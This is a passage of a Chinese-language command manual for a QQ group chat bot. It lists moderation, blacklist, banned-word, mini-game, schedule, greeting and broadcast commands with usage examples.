<tbody><tr>
<td><code>bwon</code></td>
<td>开启违禁词监控</td>
<td><code>bwon</code></td>
</tr>
<tr>
<td><code>bwoff</code></td>
<td>关闭违禁词监控</td>
<td><code>bwoff</code></td>
</tr>
<tr>
<td><code>bwlist</code></td>
<td>查看违禁词列表</td>
<td><code>bwlist</code></td>
</tr>
<tr>
<td><code>bwadd+词</code></td>
<td>添加违禁词</td>
<td><code>bwadd暴力</code></td>
</tr>
<tr>
<td><code>bwrm+词</code></td>
<td>删除违禁词</td>
<td><code>bwrm暴力</code></td>
</tr>
<tr>
<td><code>vcon</code></td>
<td>开启视频监控</td>
<td><code>vcon</code></td>
</tr>
<tr>
<td><code>vcoff</code></td>
<td>关闭视频监控</td>
<td><code>vcoff</code></td>
</tr>
<tr>
<td><code>banwords</code></td>
<td>显示违禁词系统菜单</td>
<td><code>banwords</code></td>
</tr>
</tbody></table>
<h3 id="违禁词监控-2（开发中）"><a href="#违禁词监控-2（开发中）" class="headerlink" title="违禁词监控 2（开发中）"></a>违禁词监控 2（开发中）</h3><h4 id="管理员命令"><a href="#管理员命令" class="headerlink" title="管理员命令"></a>管理员命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>bw2add&lt;词&gt; &lt;权值&gt;</code></td>
<td>添加违禁词到指定群的词库</td>
<td><code>bw2add暴力 10</code></td>
</tr>
<tr>
<td><code>bw2del&lt;词&gt;</code></td>
<td>删除指定群的违禁词</td>
<td><code>bw2del暴力</code></td>
</tr>
<tr>
<td><code>bw2defaultadd&lt;词&gt; &lt;权值&gt;</code></td>
<td>添加违禁词到默认词库</td>
<td><code>bw2defaultadd暴力 10</code></td>
</tr>
<tr>
<td><code>bw2defaultdel&lt;词&gt;</code></td>
<td>删除默认违禁词</td>
<td><code>bw2defaultdel暴力</code></td>
</tr>
<tr>
<td><code>bw2list</code></td>
<td>查看指定群的违禁词列表</td>
<td><code>bw2list</code></td>
</tr>
<tr>
<td><code>bw2defaultlist</code></td>
<td>查看默认违禁词列表</td>
<td><code>bw2defaultlist</code></td>
</tr>
</tbody></table>
<h3 id="黑名单系统使用手册"><a href="#黑名单系统使用手册" class="headerlink" title="黑名单系统使用手册"></a>黑名单系统使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>bladd</code></td>
<td>添加用户到黑名单并踢出群聊。支持使用@或 QQ 号。</td>
<td><code>bladd@123456</code></td>
</tr>
<tr>
<td><code>blrm</code></td>
<td>从黑名单中移除用户。支持使用@或 QQ 号。</td>
<td><code>blrm@123456</code></td>
</tr>
<tr>
<td><code>bllist</code></td>
<td>查看当前群的黑名单。</td>
<td><code>bllist</code></td>
</tr>
<tr>
<td><code>blcheck</code></td>
<td>检查用户是否在黑名单中。支持使用@或 QQ 号。</td>
<td><code>blcheck@123456</code></td>
</tr>
<tr>
<td><code>blscan</code></td>
<td>扫描群内成员是否在云端黑名单中。</td>
<td><code>blscan</code></td>
</tr>
<tr>
<td><code>bltall</code></td>
<td>踢出所有在云端黑名单中的群成员。</td>
<td><code>bltall</code></td>
</tr>
<tr>
<td><code>blacklist</code></td>
<td>显示黑名单系统菜单。</td>
<td><code>blacklist</code></td>
</tr>
<tr>
<td><code>黑名单系统</code></td>
<td>显示黑名单系统菜单。</td>
<td><code>黑名单系统</code></td>
</tr>
</tbody></table>
<p><strong>注意</strong>: 所有命令均需在群聊中使用，且用户需具备相应权限（群主或管理员）才能执行。</p>
<h3 id="ClassTable-使用手册"><a href="#ClassTable-使用手册" class="headerlink" title="ClassTable 使用手册"></a>ClassTable 使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>classtable</code> 或 <code>课程表</code></td>
<td>显示课程表菜单，提供功能说明。</td>
<td><code>classtable</code> 或 <code>课程表</code></td>
</tr>
<tr>
<td><code>查看今日课表</code> 或 <code>今日课表</code> 或 <code>classtabletoday</code></td>
<td>查看并发送今日的课程表。</td>
<td><code>查看今日课表</code> 或 <code>今日课表</code> 或 <code>classtabletoday</code></td>
</tr>
<tr>
<td><code>取消课程表订阅</code> 或 <code>classtableoff</code></td>
<td>取消当前群的课程表订阅，删除对应的课程表文件。</td>
<td><code>取消课程表订阅</code> 或 <code>classtableoff</code></td>
</tr>
<tr>
<td>WakeUp 课程表分享口令</td>
<td>导入课程表，需从 WakeUp 课程表 APP 复制分享口令并发送。</td>
<td><code>这是来自「WakeUp课程表」的课表分享，...分享口令为「&lt;口令&gt;」</code></td>
</tr>
</tbody></table>
<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><ol>
<li><p><strong>查看课程表菜单</strong></p>
<ul>
<li>输入 <code>classtable</code> 或 <code>课程表</code>，将显示课程表功能的使用说明。</li>
</ul>
</li>
<li><p><strong>查看今日课表</strong></p>
<ul>
<li>输入 <code>查看今日课表</code>、<code>今日课表</code> 或 <code>classtabletoday</code>，将获取并发送今日的课程表。</li>
</ul>
</li>
<li><p><strong>取消课程表订阅</strong></p>
<ul>
<li>输入 <code>取消课程表订阅</code> 或 <code>classtableoff</code>，将取消当前群的课程表订阅并删除相关文件。</li>
</ul>
</li>
<li><p><strong>导入课程表</strong></p>
<ul>
<li>复制 WakeUp 课程表 APP 的分享口令并发送，格式为 <code>这是来自「WakeUp课程表」的课表分享，...分享口令为「&lt;口令&gt;」</code>，系统将自动导入课程表。</li>
</ul>
</li>
</ol>
<p>请根据以上命令和示例进行操作。</p>
<h3 id="CollectTheSun-使用手册"><a href="#CollectTheSun-使用手册" class="headerlink" title="CollectTheSun 使用手册"></a>CollectTheSun 使用手册</h3><p>以下是 CollectTheSun 项目的命令列表及其示例：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>sunmenu</code></td>
<td>显示指令列表</td>
<td><code>sunmenu</code></td>
</tr>
<tr>
<td><code>收集阳光</code></td>
<td>收集阳光</td>
<td><code>收集阳光</code> 或 <code>sun</code></td>
</tr>
<tr>
<td><code>收集雨水</code></td>
<td>收集雨水</td>
<td><code>收集雨水</code> 或 <code>rain</code></td>
</tr>
<tr>
<td><code>查看信息</code></td>
<td>查看自己的信息</td>
<td><code>查看信息</code> 或 <code>suninfo</code></td>
</tr>
<tr>
<td><code>查看别人信息</code></td>
<td>查看他人信息</td>
<td><code>查看信息@</code> 或 <code>suninfo@</code></td>
</tr>
<tr>
<td><code>加入奇遇</code></td>
<td>加入奇遇事件</td>
<td><code>加入奇遇</code> 或 <code>sunjoin</code></td>
</tr>
<tr>
<td><code>退出奇遇</code></td>
<td>退出奇遇事件</td>
<td><code>退出奇遇</code> 或 <code>sunquit</code></td>
</tr>
<tr>
<td><code>阳光榜</code></td>
<td>查看阳光排行榜</td>
<td><code>阳光榜</code> 或 <code>sunrank</code></td>
</tr>
<tr>
<td><code>雨水榜</code></td>
<td>查看雨水排行榜</td>
<td><code>雨水榜</code> 或 <code>rainrank</code></td>
</tr>
<tr>
<td><code>偷阳光</code></td>
<td>偷取他人阳光</td>
<td><code>偷阳光@</code> 或 <code>stealsun@</code></td>
</tr>
<tr>
<td><code>偷雨水</code></td>
<td>偷取他人雨水</td>
<td><code>偷雨水@</code> 或 <code>stealrain@</code></td>
</tr>
<tr>
<td><code>送阳光</code></td>
<td>赠送阳光给他人</td>
<td><code>送阳光@数量</code> 或 <code>givesun@数量</code></td>
</tr>
<tr>
<td><code>送雨水</code></td>
<td>赠送雨水给他人</td>
<td><code>送雨水@数量</code> 或 <code>giverain@数量</code></td>
</tr>
<tr>
<td><code>sunadd</code></td>
<td>管理员命令，增加阳光</td>
<td><code>sunadd [CQ:at,qq=用户ID]数量</code></td>
</tr>
<tr>
<td><code>rainadd</code></td>
<td>管理员命令，增加雨水</td>
<td><code>rainadd [CQ:at,qq=用户ID]数量</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意</strong>:</p>
<ul>
<li><code>@</code> 表示需要在命令中提及目标用户。</li>
<li>管理员命令需要拥有相应权限。</li>
<li>某些命令可能会受到冷却时间的限制。</li>
</ul>
</blockquote>
<h3 id="密码工具"><a href="#密码工具" class="headerlink" title="密码工具"></a>密码工具</h3><p>以下是该程序支持的命令及其使用实例：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>b64d</code></td>
<td>解码 Base64</td>
<td><code>b64d SGVsbG8gd29ybGQ=</code></td>
</tr>
<tr>
<td><code>b64e</code></td>
<td>编码 Base64</td>
<td><code>b64e Hello world</code></td>
</tr>
<tr>
<td><code>hash</code></td>
<td>计算哈希值</td>
<td><code>hash Hello world</code></td>
</tr>
<tr>
<td><code>bin2all</code></td>
<td>二进制转其他进制</td>
<td><code>bin2all 1010</code></td>
</tr>
<tr>
<td><code>oct2all</code></td>
<td>八进制转其他进制</td>
<td><code>oct2all 12</code></td>
</tr>
<tr>
<td><code>dec2all</code></td>
<td>十进制转其他进制</td>
<td><code>dec2all 10</code></td>
</tr>
<tr>
<td><code>hex2all</code></td>
<td>十六进制转其他进制</td>
<td><code>hex2all a</code></td>
</tr>
<tr>
<td><code>genpass</code></td>
<td>生成强密码</td>
<td><code>genpass 12 3</code></td>
</tr>
<tr>
<td><code>md5e</code></td>
<td>计算 MD5 编码</td>
<td><code>md5e Hello world</code></td>
</tr>
</tbody></table>
<p><strong>注意：</strong></p>
<ul>
<li><code>genpass</code> 命令的格式为 <code>genpass &lt;长度&gt; &lt;复杂度&gt;</code>，其中长度范围为 1-100，复杂度范围为 1-3。</li>
<li>复杂度等级：<ul>
<li>1: 小写字母和数字</li>
<li>2: 大小写字母和数字</li>
<li>3: 大小写字母、数字和标点符号</li>
</ul>
</li>
</ul>
<h3 id="群管理"><a href="#群管理" class="headerlink" title="群管理"></a>群管理</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>groupmanager</code></td>
<td>显示群管理系统菜单</td>
<td><code>groupmanager</code> 或 <code>群管</code></td>
</tr>
<tr>
<td><code>ban@ 时间</code></td>
<td>禁言指定用户 x 秒，默认 60 秒</td>
<td><code>ban@ 30</code></td>
</tr>
<tr>
<td><code>unban@</code></td>
<td>解除指定用户禁言</td>
<td><code>unban@</code></td>
</tr>
<tr>
<td><code>banme</code></td>
<td>随机禁言自己随机秒</td>
<td><code>banme</code> 或 <code>禁言我</code></td>
</tr>
<tr>
<td><code>banmerank</code></td>
<td>查看当日禁言排行</td>
<td><code>banmerank</code></td>
</tr>
<tr>
<td><code>banrandom</code></td>
<td>随机禁言一个群友随机秒</td>
<td><code>banrandom</code> 或 <code>随机禁言</code></td>
</tr>
<tr>
<td><code>banall</code></td>
<td>全员禁言</td>
<td><code>banall</code></td>
</tr>
<tr>
<td><code>unbanall</code></td>
<td>全员解禁</td>
<td><code>unbanall</code></td>
</tr>
<tr>
<td><code>t@</code></td>
<td>踢出指定用户</td>
<td><code>t@</code></td>
</tr>
<tr>
<td><code>del</code></td>
<td>撤回消息（需回复要撤回的消息）</td>
<td><code>del</code></td>
</tr>
<tr>
<td><code>vc-on</code></td>
<td>开启视频监控</td>
<td><code>vc-on</code></td>
</tr>
<tr>
<td><code>vc-off</code></td>
<td>关闭视频监控</td>
<td><code>vc-off</code></td>
</tr>
<tr>
<td><code>wf-on</code></td>
<td>开启欢迎欢送</td>
<td><code>wf-on</code></td>
</tr>
<tr>
<td><code>wf-off</code></td>
<td>关闭欢迎欢送</td>
<td><code>wf-off</code></td>
</tr>
<tr>
<td><code>wf-set</code></td>
<td>设置欢迎词</td>
<td><code>wf-set</code></td>
</tr>
<tr>
<td><code>测试</code></td>
<td>管理员测试命令，返回测试成功</td>
<td><code>测试</code> 或 <code>test</code></td>
</tr>
</tbody></table>
<h3 id="ImageGenerate-使用手册"><a href="#ImageGenerate-使用手册" class="headerlink" title="ImageGenerate 使用手册"></a>ImageGenerate 使用手册</h3><h4 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h4><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例命令</th>
</tr>
</thead>
<tbody><tr>
<td>狂粉</td>
<td>在图片上添加文字 “狂粉”</td>
<td><code>狂粉 Hello</code></td>
</tr>
<tr>
<td>hand</td>
<td>在图片上添加文字 “hand”</td>
<td><code>handHello</code></td>
</tr>
<tr>
<td>网安邀请函</td>
<td>在图片上添加文字 “网安邀请函”</td>
<td><code>网安邀请函 Hello</code></td>
</tr>
</tbody></table>
<h4 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h4><ul>
<li><p><strong>狂粉</strong>:</p>
<ul>
<li>描述: 在指定的图片上添加文字，文字长度需在 1 到 10 个字符之间。</li>
<li>示例: <code>狂粉Hello</code></li>
</ul>
</li>
<li><p><strong>hand</strong>:</p>
<ul>
<li>描述: 在指定的图片上添加文字，文字长度需在 1 到 10 个字符之间。</li>
<li>示例: <code>handHello</code></li>
</ul>
</li>
<li><p><strong>网安邀请函</strong>:</p>
<ul>
<li>描述: 在指定的图片上添加文字，文字长度需在 1 到 6 个字符之间。</li>
<li>示例: <code>网安邀请函 Hello</code></li>
</ul>
</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>输入的文字长度必须符合各命令的要求，否则会提示输入内容不合法。</li>
<li>如果输入的文字为空，系统会提示重新输入。</li>
</ul>
<h3 id="邀请链系统使用手册"><a href="#邀请链系统使用手册" class="headerlink" title="邀请链系统使用手册"></a>邀请链系统使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>icon</code></td>
<td>开启邀请链功能</td>
<td><code>icon</code></td>
</tr>
<tr>
<td><code>icoff</code></td>
<td>关闭邀请链功能</td>
<td><code>icoff</code></td>
</tr>
<tr>
<td><code>iclist@</code></td>
<td>查看某用户的邀请链</td>
<td><code>iclist@123456789</code></td>
</tr>
<tr>
<td><code>invitechain</code></td>
<td>显示邀请链系统菜单</td>
<td><code>invitechain</code></td>
</tr>
</tbody></table>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>开启邀请链功能</strong>: 发送 <code>icon</code> 到群聊。</li>
<li><strong>关闭邀请链功能</strong>: 发送 <code>icoff</code> 到群聊。</li>
<li><strong>查看某用户的邀请链</strong>: 发送 <code>iclist@123456789</code>，其中 <code>123456789</code> 是目标用户的 QQ 号。</li>
<li><strong>显示邀请链系统菜单</strong>: 发送 <code>invitechain</code> 到群聊。</li>
</ul>
<blockquote>
<p>注意：只有群主、管理员或 root 管理员可以使用这些命令。</p>
</blockquote>
<h3 id="关键词回复系统使用手册"><a href="#关键词回复系统使用手册" class="headerlink" title="关键词回复系统使用手册"></a>关键词回复系统使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>kron</code></td>
<td>开启关键词回复功能</td>
<td><code>kron</code></td>
</tr>
<tr>
<td><code>kroff</code></td>
<td>关闭关键词回复功能</td>
<td><code>kroff</code></td>
</tr>
<tr>
<td><code>kradd关键词 回复</code></td>
<td>添加关键词回复</td>
<td><code>kradd你好 你好世界</code></td>
</tr>
<tr>
<td><code>krrm关键词</code></td>
<td>删除关键词回复</td>
<td><code>krrm你好</code></td>
</tr>
<tr>
<td><code>keywordsreply</code></td>
<td>显示关键词回复系统菜单</td>
<td><code>keywordsreply</code></td>
</tr>
</tbody></table>
<p><strong>说明</strong>:</p>
<ul>
<li><code>kradd</code> 命令用于添加关键词及其对应的回复，格式为 <code>kradd关键词 回复</code>。</li>
<li><code>krrm</code> 命令用于删除指定的关键词及其回复，格式为 <code>krrm关键词</code>。</li>
<li><code>kron</code> 和 <code>kroff</code> 用于开启和关闭关键词回复功能。</li>
<li><code>keywordsreply</code> 命令用于显示系统菜单。</li>
</ul>
<h3 id="群名片锁使用手册"><a href="#群名片锁使用手册" class="headerlink" title="群名片锁使用手册"></a>群名片锁使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>lgcon</code></td>
<td>开启群名片锁</td>
<td><code>lgcon</code></td>
</tr>
<tr>
<td><code>lgcoff</code></td>
<td>关闭群名片锁</td>
<td><code>lgcoff</code></td>
</tr>
<tr>
<td><code>lgclock</code></td>
<td>锁定群名片</td>
<td><code>lgclock[CQ:at,qq=12345]新名片</code></td>
</tr>
<tr>
<td><code>lgcunlock</code></td>
<td>解锁群名片</td>
<td><code>lgcunlock[CQ:at,qq=12345]</code></td>
</tr>
<tr>
<td><code>lgcset</code></td>
<td>修改群名片</td>
<td><code>lgcset[CQ:at,qq=12345]新名片</code></td>
</tr>
<tr>
<td><code>lockgroupcard</code></td>
<td>显示群名片锁菜单</td>
<td><code>lockgroupcard</code></td>
</tr>
</tbody></table>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>开启群名片锁</strong>:<ul>
<li>输入 <code>lgcon</code>，系统会回复群名片锁已开启。</li>
</ul>
</li>
<li><strong>关闭群名片锁</strong>:<ul>
<li>输入 <code>lgcoff</code>，系统会回复群名片锁已关闭。</li>
</ul>
</li>
<li><strong>锁定群名片</strong>:<ul>
<li>输入 <code>lgclock[CQ:at,qq=12345]新名片</code>，将用户 <code>12345</code> 的群名片锁定为 <code>新名片</code>。</li>
</ul>
</li>
<li><strong>解锁群名片</strong>:<ul>
<li>输入 <code>lgcunlock[CQ:at,qq=12345]</code>，将用户 <code>12345</code> 的群名片解锁。</li>
</ul>
</li>
<li><strong>修改群名片</strong>:<ul>
<li>输入 <code>lgcset[CQ:at,qq=12345]新名片</code>，将用户 <code>12345</code> 的群名片修改为 <code>新名片</code>。</li>
</ul>
</li>
<li><strong>显示群名片锁菜单</strong>:<ul>
<li>输入 <code>lockgroupcard</code>，系统会显示群名片锁的所有可用命令。</li>
</ul>
</li>
</ul>
<h3 id="NoAddOne-使用手册"><a href="#NoAddOne-使用手册" class="headerlink" title="NoAddOne 使用手册"></a>NoAddOne 使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>naoon</code></td>
<td>开启打断复读功能</td>
<td><code>naoon</code></td>
</tr>
<tr>
<td><code>naooff</code></td>
<td>关闭打断复读功能</td>
<td><code>naooff</code></td>
</tr>
<tr>
<td><code>noaddone</code></td>
<td>显示帮助菜单</td>
<td><code>noaddone</code></td>
</tr>
</tbody></table>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><ul>
<li><p><strong>开启打断复读功能</strong>:<br>输入 <code>naoon</code>，将会开启打断复读功能，并回复确认信息。</p>
</li>
<li><p><strong>关闭打断复读功能</strong>:<br>输入 <code>naooff</code>，将会关闭打断复读功能，并回复确认信息。</p>
</li>
<li><p><strong>显示帮助菜单</strong>:<br>输入 <code>noaddone</code>，将会显示可用命令的帮助菜单。</p>
</li>
</ul>
<h3 id="PokePal-使用手册"><a href="#PokePal-使用手册" class="headerlink" title="PokePal 使用手册"></a>PokePal 使用手册</h3><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><table>
<thead>
<tr>
<th>命令格式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>[CQ:reply,id=&lt;消息ID&gt;].*骚扰&lt;次数&gt;</code></td>
<td>对指定消息进行骚扰指定次数</td>
</tr>
<tr>
<td><code>[CQ:reply,id=&lt;消息ID&gt;].*骚扰</code></td>
<td>对指定消息进行骚扰 20 次</td>
</tr>
</tbody></table>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><table>
<thead>
<tr>
<th>示例命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>[CQ:reply,id=12345].*骚扰5</code></td>
<td>对消息 ID 为 12345 的消息进行 5 次骚扰</td>
</tr>
<tr>
<td><code>[CQ:reply,id=67890].*骚扰</code></td>
<td>对消息 ID 为 67890 的消息进行 20 次骚扰</td>
</tr>
</tbody></table>
<h3 id="QASystem-使用手册"><a href="#QASystem-使用手册" class="headerlink" title="QASystem 使用手册"></a>QASystem 使用手册</h3><p>以下是 QASystem 的命令及其使用示例：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>qaon</code></td>
<td>开启问答系统</td>
<td><code>qaon</code></td>
</tr>
<tr>
<td><code>qaoff</code></td>
<td>关闭问答系统</td>
<td><code>qaoff</code></td>
</tr>
<tr>
<td><code>qaadd</code></td>
<td>批量添加或更新问答对</td>
<td><code>qaadd 问题1 答案1 问题2 答案2</code></td>
</tr>
<tr>
<td><code>qarm</code></td>
<td>删除指定问题的问答对</td>
<td><code>qarm问题1</code></td>
</tr>
<tr>
<td><code>qalist</code></td>
<td>查看问答对列表</td>
<td><code>qalist</code></td>
</tr>
<tr>
<td><code>qasolo</code></td>
<td>比较两个词语的相似度</td>
<td><code>qasolo词语1 词语2</code></td>
</tr>
<tr>
<td><code>qasystem</code></td>
<td>显示问答系统菜单</td>
<td><code>qasystem</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意</strong>:</p>
<ul>
<li><code>qaadd</code> 命令后面可以跟多个问答对，格式为 <code>问题 答案</code>，多个问答对之间用空格分隔。</li>
<li><code>qarm</code> 命令后面直接跟要删除的问题。</li>
<li><code>qasolo</code> 命令用于比较两个词语的相似度，格式为 <code>词语1 词语2</code>。</li>
</ul>
</blockquote>
<h3 id="QFNUBustExamClassroomFind-使用手册"><a href="#QFNUBustExamClassroomFind-使用手册" class="headerlink" title="QFNUBustExamClassroomFind 使用手册"></a>QFNUBustExamClassroomFind 使用手册</h3><p>以下是 <code>QFNUBustExamClassroomFind</code> 脚本的命令及其使用实例。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>qfnubecf</code></td>
<td>切换曲阜师范大学期末考试考场教室查询功能的开关状态。</td>
<td><code>qfnubecf</code></td>
</tr>
<tr>
<td><code>xxx考场</code></td>
<td>查询指定考场的教室信息，其中 <code>xxx</code> 为考场名称。</td>
<td><code>综合教学楼考场</code></td>
</tr>
</tbody></table>
<h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>开启&#x2F;关闭功能</strong>: 发送 <code>qfnubecf</code> 命令以切换功能状态。</li>
<li><strong>查询考场信息</strong>: 发送 <code>综合教学楼考场</code> 以查询综合教学楼的考场教室信息。</li>
</ul>
<blockquote>
<p><strong>注意</strong>: 只有授权用户才能切换功能状态。查询功能开启后，群内成员可以使用考场查询命令。</p>
</blockquote>
<h3 id="QFNUTracker-使用手册"><a href="#QFNUTracker-使用手册" class="headerlink" title="QFNUTracker 使用手册"></a>QFNUTracker 使用手册</h3><p>以下是 QFNUTracker 的命令及其使用实例：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>qfnujwcon</code></td>
<td>开启教务处监控</td>
<td><code>qfnujwcon</code></td>
</tr>
<tr>
<td><code>qfnujwcoff</code></td>
<td>关闭教务处监控</td>
<td><code>qfnujwcoff</code></td>
</tr>
<tr>
<td><code>qfnuzccon</code></td>
<td>开启资产处监控</td>
<td><code>qfnuzccon</code></td>
</tr>
<tr>
<td><code>qfnuzccoff</code></td>
<td>关闭资产处监控</td>
<td><code>qfnuzccoff</code></td>
</tr>
<tr>
<td><code>qfnu</code></td>
<td>显示 QFNU 定制服务信息</td>
<td><code>qfnu</code></td>
</tr>
</tbody></table>
<p>以上命令可通过发送相应的消息来触发。请根据需要选择合适的命令进行操作。</p>
<h3 id="群发消息命令使用手册"><a href="#群发消息命令使用手册" class="headerlink" title="群发消息命令使用手册"></a>群发消息命令使用手册</h3><p>以下是 <code>handle_SendAll_group_message</code> 函数支持的命令及其使用示例：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>sendadd</code></td>
<td>添加群号到群发列表</td>
<td><code>sendadd123456789</code></td>
</tr>
<tr>
<td><code>sendrm</code></td>
<td>从群发列表中删除群号</td>
<td><code>sendrm123456789</code></td>
</tr>
<tr>
<td><code>sendlist</code></td>
<td>列出所有群发的群号</td>
<td><code>sendlist</code></td>
</tr>
<tr>
<td><code>sendall</code></td>
<td>向所有群发列表中的群发送消息</td>
<td><code>sendallHello, everyone!</code></td>
</tr>
</tbody></table>
<p><strong>注意事项：</strong></p>
<ul>
<li>只有在 <code>owner_id</code> 列表中的用户才能执行这些命令。</li>
<li><code>sendadd</code> 和 <code>sendrm</code> 命令后面需要紧跟群号。</li>
<li><code>sendall</code> 命令后面需要紧跟要发送的消息内容。</li>
</ul>
<h3 id="软封禁系统使用手册"><a href="#软封禁系统使用手册" class="headerlink" title="软封禁系统使用手册"></a>软封禁系统使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>sbadd@</code></td>
<td>添加软封禁用户，使用 <code>@</code> 或 QQ 号指定用户。</td>
<td><code>sbadd@123456</code></td>
</tr>
<tr>
<td><code>sbrm@</code></td>
<td>删除软封禁用户，使用 <code>@</code> 或 QQ 号指定用户。</td>
<td><code>sbrm@123456</code></td>
</tr>
<tr>
<td><code>sblist</code></td>
<td>查看当前群的软封禁用户列表。</td>
<td><code>sblist</code></td>
</tr>
<tr>
<td><code>softban</code></td>
<td>显示软封禁系统菜单，包含所有可用命令的说明。</td>
<td><code>softban</code></td>
</tr>
</tbody></table>
<p><strong>注意</strong>: 以上命令需要管理员权限才能执行。</p>
<h3 id="TimeAwareGreetings-使用手册"><a href="#TimeAwareGreetings-使用手册" class="headerlink" title="TimeAwareGreetings 使用手册"></a>TimeAwareGreetings 使用手册</h3><h4 id="命令与实例"><a href="#命令与实例" class="headerlink" title="命令与实例"></a>命令与实例</h4><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>早安</code></td>
<td>发送早晨问候语</td>
<td><code>早安～</code></td>
</tr>
<tr>
<td><code>中午好</code></td>
<td>发送中午问候语</td>
<td><code>中午好，记得吃饭哦！</code></td>
</tr>
<tr>
<td><code>晚安</code></td>
<td>发送晚上问候语</td>
<td><code>晚安，做个好梦！</code></td>
</tr>
<tr>
<td><code>早上好</code></td>
<td>发送早晨问候语</td>
<td><code>早上好，今天又是元气满满的一天！</code></td>
</tr>
<tr>
<td><code>午安</code></td>
<td>发送中午问候语</td>
<td><code>午安，充实的午后，别忘了补充维C！</code></td>
</tr>
<tr>
<td><code>晚上好</code></td>
<td>发送晚上问候语</td>
<td><code>夜深了，早点休息哦～</code></td>
</tr>
<tr>
<td><code>起床</code></td>
<td>发送早晨问候语</td>
<td><code>太阳都晒屁股了，快起床吧～</code></td>
</tr>
<tr>
<td><code>午休</code></td>
<td>发送中午问候语</td>
<td><code>午休时间到了，休息一下吧！</code></td>
</tr>
<tr>
<td><code>睡觉</code></td>
<td>发送晚上问候语</td>
<td><code>别熬夜了，晚安～</code></td>
</tr>
</tbody></table>
<h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>根据用户输入的关键词匹配到对应的时段，发送相应的问候语。</li>
<li>如果用户输入的时段与当前时段不匹配，将发送不合时宜的提示。</li>
<li>以上命令仅为示例，实际使用中请根据具体需求进行调整。</li>
</ul>
<h3 id="WelcomeFarewell-使用手册"><a href="#WelcomeFarewell-使用手册" class="headerlink" title="WelcomeFarewell 使用手册"></a>WelcomeFarewell 使用手册</h3><h4 id="命令与实例-1"><a href="#命令与实例-1" class="headerlink" title="命令与实例"></a>命令与实例</h4><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>welcomefarewell</code></td>
<td>显示总菜单</td>
<td><code>welcomefarewell</code></td>
</tr>
<tr>
<td><code>wfon</code></td>
<td>开启入群欢迎</td>
<td><code>wfon</code></td>
</tr>
<tr>
<td><code>wfoff</code></td>
<td>关闭入群欢迎</td>
<td><code>wfoff</code></td>
</tr>
<tr>
<td><code>ffon</code></td>
<td>开启退群欢送</td>
<td><code>ffon</code></td>
</tr>
<tr>
<td><code>ffoff</code></td>
<td>关闭退群欢送</td>
<td><code>ffoff</code></td>
</tr>
<tr>
<td><code>welcomeset &lt;自定义欢迎词&gt;</code></td>
<td>设置自定义入群欢迎词</td>
<td><code>welcomeset 欢迎新朋友！</code></td>
</tr>
<tr>
<td><code>farewellset &lt;自定义欢送词&gt;</code></td>
<td>设置自定义退群欢送词</td>
<td><code>farewellset 再见，祝好运！</code></td>
</tr>
</tbody></table>
<h4 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>只有管理员或群主可以使用以上命令。</li>
<li>自定义消息中可以包含 CQ 码。</li>
<li>系统会自动记录成员的入群时间和退群时间。</li>
</ul>
